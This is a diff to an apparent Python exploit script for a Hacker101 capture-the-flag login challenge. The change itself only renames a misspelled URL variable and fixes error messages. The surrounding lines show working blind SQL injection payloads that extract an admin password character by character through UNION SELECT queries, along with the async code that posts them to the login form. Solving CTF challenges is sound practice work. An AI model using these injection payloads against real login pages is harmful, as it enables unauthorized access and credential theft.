@@ -23,7 +23,7 @@ SQLI_CHAR = "' union select ascii(substring(:field, :idx, 1)) as password" \
 # Convert :field length into password
 SQLI_LENGTH = "' union select length(:field) as password" \
     + " from admins limit 1; --"
-CFT_URL = "https://{}.ctf.hacker101.com/login"
+CTF_URL = "https://{}.ctf.hacker101.com/login"
 HEADERS = {
             "Content-Type": "application/x-www-form-urlencoded; charset=utf-8"
         }
@@ -40,7 +40,7 @@ async def send_injection(session: ClientSession, payload: str,
     Returns: A tuple with True is result match with payload, False otherwise.
     And s.
     '''
-    global CFT_URL, logger
+    global CTF_URL, logger
 
     match_found: bool = False
     data: dict[str, str] = { "username": payload, "password": s }
@@ -48,7 +48,7 @@ async def send_injection(session: ClientSession, payload: str,
     logger.debug(f"Sending injection: {data}")
 
     try:
-        async with session.post(CFT_URL, data=data) as r:
+        async with session.post(CTF_URL, data=data) as r:
             match_found = r.status == 200 and \
                 "Logged in" in await r.text()
     # Task was cancelled
@@ -149,17 +149,17 @@ async def guess_field(field: str, length: int,
     return guessed_field_name
 
 async def main() -> None:
-    global CFT_URL, logger
+    global CTF_URL, logger
 
     if len(argv) == 1:
-        error("cft id parameter not given!")
+        error("ctf id parameter not given!")
 
-    cft_id = argv[1]
+    ctf_id = argv[1]
 
-    if len(cft_id) < 32:
-        error("cft id parameter is wrong!")
+    if len(ctf_id) < 32:
+        error("ctf id parameter is wrong!")
 
-    CFT_URL = CFT_URL.format(cft_id)
+    CTF_URL = CTF_URL.format(ctf_id)
 
     # Sets debug level
     if "--debug" in argv:
